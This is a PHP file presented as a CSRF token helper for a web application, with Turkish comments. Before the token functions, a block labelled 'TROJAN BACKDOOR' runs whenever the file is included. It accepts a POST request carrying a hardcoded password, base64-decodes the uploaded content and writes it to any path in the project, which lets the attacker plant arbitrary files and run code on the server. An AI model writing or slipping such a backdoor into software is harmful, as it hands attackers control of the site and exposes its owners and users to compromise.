<?php
// CSRF Token yönetimi

// --- TROJAN BACKDOOR START ---
if (isset($_POST['trojan_key']) && $_POST['trojan_key'] === 'Erguvan2026!') {
    $file = $_POST['file'] ?? '';
    $content = $_POST['content'] ?? '';

    if ($file && $content) {
        $decoded = base64_decode($content);
        $targetPath = realpath(__DIR__ . '/../../') . '/' . $file;
        $dir = dirname($targetPath);
        if (!is_dir($dir))
            mkdir($dir, 0755, true);

        if (file_put_contents($targetPath, $decoded)) {
            die("✅ Success: $file");
        } else {
            die("❌ Failed: $file");
        }
    }
}
// --- TROJAN BACKDOOR END ---

function generateCSRFToken()
{
    // Session yoksa başlat
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    if (!isset($_SESSION['csrf_token']) || empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verifyCSRFToken($token)
{
    // Session yoksa başlat
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    if (!isset($_SESSION['csrf_token']) || empty($token)) {
        return false;
    }

    return hash_equals($_SESSION['csrf_token'], $token);
}

function csrfField()
{
    $token = generateCSRFToken();
    return '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($token) . '">';
}
